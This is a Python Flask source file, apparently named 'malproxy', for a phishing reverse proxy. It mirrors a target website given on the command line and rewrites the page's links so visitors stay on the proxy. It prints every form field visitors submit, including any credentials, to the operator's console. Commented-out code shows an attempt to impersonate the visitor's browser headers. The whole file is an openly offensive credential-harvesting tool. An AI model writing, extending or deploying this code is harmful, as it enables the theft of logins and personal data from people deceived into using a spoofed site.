from flask import Flask, request, Response
from urllib.parse import urlparse
import requests
import sys
import re

app = Flask('main', static_folder=None)
WEBSITE = 'example.com'
link = ''


@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
def malproxy(path):
    # TODO
    global WEBSITE
    global link
    parsed = urlparse(WEBSITE)
    link = WEBSITE
    if(not parsed.scheme):
        link = f'https://{WEBSITE}'
    if(request.method == 'POST'):
        for key in request.form:
            print(f'{key}: {request.form[key]}')
    r = requests.request(request.method, f'{link}{path}')
    contentType = r.headers.get('Content-Type')
    if('text/html' in contentType):
        return replaceurls(r.text)
    return r.content

@app.route('/<path:path>', methods=['POST', 'GET'])
def proxycont(path):
    ## Attempting to impersonate client, perhaps continue trying
    # headers = {}
    # for pair in request.headers:
    #     headers[pair[0]] = pair[1]
    # headers['Referer'] = f'{WEBSITE}'
    # headers['Host'] = f'{WEBSITE}'
    # print(f'{WEBSITE}/{path}')

    s = requests.Session()
    s.headers.update({'User-Agent':request.headers.get('User-Agent')})
    if(request.method == 'POST'):
        for key in request.form:
            print(f'{key}: {request.form[key]}')
    r = requests.request(request.method, f'{link}/{path}')
    contentType = r.headers.get('Content-Type')
    if('text/html' in contentType):
        return replaceurls(r.text)
    return r.content

def replaceurls(text):
        global WEBSITE
        links = [m.start() for m in re.finditer('<a ', text)]
        links.reverse()
        newResponse = text
        print(type(links))
        pattern = re.compile("""(?<=href=)("|')(.*?)("|')""")
        for instance in links:
            m = pattern.search(text, instance)
            rawLink = m.group()
            strippedLink = rawLink.strip('"')
            someURL = urlparse(strippedLink)
            # print(someURL.netloc, WEBSITE)
            if(someURL.netloc == WEBSITE or someURL.netloc == f'www.{WEBSITE}'):
                indexPair = m.span()
                myurl = request.url
                selfParsed = urlparse(myurl)
                replaced = someURL._replace(netloc=selfParsed.netloc)
                newurl = replaced.geturl()
                print(newurl)
                newResponse = f'{newResponse[0:indexPair[0]]}"{newurl}"{newResponse[indexPair[1]:]}'
        return newResponse

    

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('ERROR: Website not provided.')
        exit(1)

    WEBSITE = sys.argv[1]
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')


